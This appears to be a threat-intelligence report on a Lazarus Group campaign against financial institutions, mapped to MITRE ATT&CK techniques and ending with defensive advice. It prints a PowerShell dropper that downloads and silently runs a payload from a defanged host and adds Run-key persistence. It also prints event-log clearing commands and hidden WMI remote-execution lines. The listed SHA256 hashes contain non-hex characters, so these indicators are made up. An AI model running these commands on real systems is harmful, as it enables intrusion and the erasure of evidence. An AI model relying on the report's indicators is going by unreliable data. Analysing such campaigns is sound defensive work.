# Lazarus Group Financial Sector Campaign - Q4 2024

## Executive Summary

The **Lazarus Group** has launched a sophisticated campaign targeting financial institutions worldwide, focusing on SWIFT payment systems and cryptocurrency exchanges. This report provides detailed analysis of their latest tactics, techniques, and procedures (TTPs).

## Attack Timeline

| Date | Event | Impact |
|------|-------|--------|
| 2024-10-01 | Initial reconnaissance begins | Target identification |
| 2024-10-15 | First spearphishing wave | 3 organizations compromised |
| 2024-10-22 | Lateral movement observed | Network-wide access achieved |
| 2024-11-01 | Data exfiltration begins | 500GB+ stolen |
| 2024-11-10 | Ransomware deployment | Systems encrypted |

## Attack Chain Analysis

### 1. Initial Access

The threat actors employed multiple initial access vectors:

- **Spearphishing Attachment** (T1566.001)
  - Malicious Excel documents with embedded macros
  - Exploits CVE-2024-5678 in Microsoft Office
  - Targets: Finance department employees

- **Valid Accounts** (T1078)
  - Compromised VPN credentials from previous breaches
  - Password spraying against exposed services

#### Code Sample - Initial Dropper

```powershell
# Decoded PowerShell from macro
$url = "https://legitimate-site[.]com/update.dat"
$path = "$env:TEMP\svchost.exe"
Invoke-WebRequest -Uri $url -OutFile $path
Start-Process $path -WindowStyle Hidden

# Persistence via Registry
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /t REG_SZ /d "$path" /f
```

### 2. Execution Techniques

The group utilized sophisticated execution methods:

1. **PowerShell** (T1059.001)
   - Base64-encoded commands
   - AMSI bypass techniques
   - Fileless execution in memory

2. **Windows Command Shell** (T1059.003)
   ```cmd
   cmd.exe /c "wmic process call create 'powershell.exe -w hidden -enc <base64>'"
   ```

3. **Scheduled Task** (T1053.005)
   - Created persistence through scheduled tasks
   - Executed every 30 minutes for beacon callbacks

### 3. Persistence Mechanisms

Multiple persistence techniques ensure continued access:

> **Note:** The attackers showed exceptional operational security by using different persistence methods on different systems to avoid pattern detection.

- Registry Run Keys (T1547.001)
- Scheduled Tasks (T1053.005)
- Service Creation (T1543.003)
- WMI Event Subscriptions (T1546.003)

### 4. Defense Evasion

#### Anti-Analysis Techniques

The malware employed several anti-analysis features:

- **Process Injection** (T1055)
  - Injected into legitimate Windows processes
  - Used `svchost.exe` and `explorer.exe` as hosts

- **Obfuscated Files** (T1027)
  - XOR encryption with rotating keys
  - Packed with custom UPX variant

- **Indicator Removal** (T1070)
  ```powershell
  # Clear event logs
  wevtutil cl Security
  wevtutil cl System
  wevtutil cl Application
  ```

### 5. Credential Access

The attackers systematically harvested credentials:

| Technique | Tool Used | Purpose |
|-----------|-----------|---------|
| **OS Credential Dumping** (T1003) | Mimikatz | Extract plaintext passwords |
| **Kerberoasting** (T1558.003) | Rubeus | Obtain service account hashes |
| **LSASS Memory** (T1003.001) | ProcDump | Dump LSASS for offline analysis |
| **Keylogging** (T1056.001) | Custom keylogger | Capture user input |

### 6. Discovery

Extensive reconnaissance was performed:

- `net user /domain` - Enumerate domain users
- `net group "Domain Admins" /domain` - Identify high-value accounts
- `nltest /dclist` - Locate domain controllers
- `arp -a` - Map local network

### 7. Lateral Movement

The group moved laterally using:

1. **Remote Desktop Protocol** (T1021.001)
2. **Windows Admin Shares** (T1021.002)
3. **PsExec** (S0029)
4. **WMI** (T1047)

Example WMI command for remote execution:
```
wmic /node:"target-host" process call create "cmd.exe /c powershell.exe -enc <base64>"
```

### 8. Collection

Data collection focused on:

- **Email Collection** (T1114)
  - Targeted executive communications
  - Search for keywords: "wire", "transfer", "SWIFT"

- **Data from Local System** (T1005)
  - Financial records
  - Customer databases
  - SWIFT configuration files

### 9. Command and Control

#### C2 Infrastructure

- **Web Protocols** (T1071.001)
  - HTTPS with custom headers
  - Domain fronting via CDNs

- **Dead Drop Resolver** (T1102.001)
  - Used compromised WordPress sites
  - Encoded commands in image EXIF data

#### C2 Domains

```
financial-update[.]com
secure-bank-portal[.]net
swift-validator[.]org
```

### 10. Exfiltration

Data was exfiltrated through multiple channels:

- **Exfiltration Over C2 Channel** (T1041)
  - Chunked transfers to avoid detection
  - Encrypted with AES-256

- **Exfiltration to Cloud Storage** (T1567.002)
  - Used compromised OneDrive accounts
  - Appeared as legitimate business activity

### 11. Impact

The final stage involved:

- **Data Encrypted for Impact** (T1486)
  - Deployed custom ransomware variant
  - Encrypted file extensions: `.lazarus`
  
- **Financial Theft**
  - Attempted SWIFT transfers totaling $50M
  - Cryptocurrency wallet drainage

## Indicators of Compromise (IOCs)

### File Hashes (SHA256)

```
3a4b5c6d7e8f9g0h1i2j3k4l5m6n7o8p9q0r1s2t3u4v5w6x7y8z9a0b1c2d3e4f
9f8e7d6c5b4a3m2n1b0v9c8x7z6a5s4d3f2g1h0j9k8l7p6o5i4u3y2t1r0e9w8
```

### Network Indicators

- C2 Server: `185.174.137[.]42`
- User-Agent: `Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0; LazarusBot)`

### Registry Keys

```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SecurityUpdate
HKLM\SYSTEM\CurrentControlSet\Services\LazarusSvc
```

## Defensive Recommendations

### Immediate Actions

1. **Block IOCs** at network and endpoint levels
2. **Reset credentials** for all privileged accounts
3. **Audit PowerShell usage** and enable ScriptBlock logging
4. **Review scheduled tasks** for suspicious entries

### Long-term Mitigations

- Implement **application whitelisting**
- Deploy **EDR solutions** with behavioral detection
- Enable **multi-factor authentication** universally
- Conduct regular **threat hunting** exercises
- Implement **network segmentation** for critical systems

## MITRE ATT&CK Navigator Layer

```json
{
  "name": "Lazarus Financial Campaign 2024",
  "versions": {
    "attack": "14",
    "navigator": "4.9.1"
  },
  "techniques": [
    {"techniqueID": "T1566.001", "score": 100},
    {"techniqueID": "T1059.001", "score": 100},
    {"techniqueID": "T1055", "score": 85},
    {"techniqueID": "T1003", "score": 90},
    {"techniqueID": "T1021.001", "score": 75},
    {"techniqueID": "T1486", "score": 100}
  ]
}
```

## Conclusion

The Lazarus Group continues to evolve their TTPs, demonstrating increased sophistication in targeting financial institutions. Their use of **living-off-the-land** techniques, combined with custom malware and robust operational security, makes detection and attribution challenging. Organizations must adopt a defense-in-depth strategy and maintain vigilant monitoring to detect and respond to these advanced threats.

---

*Report compiled by Threat Intelligence Team*  
*Classification: TLP:WHITE*  
*Last Updated: 2024-11-15*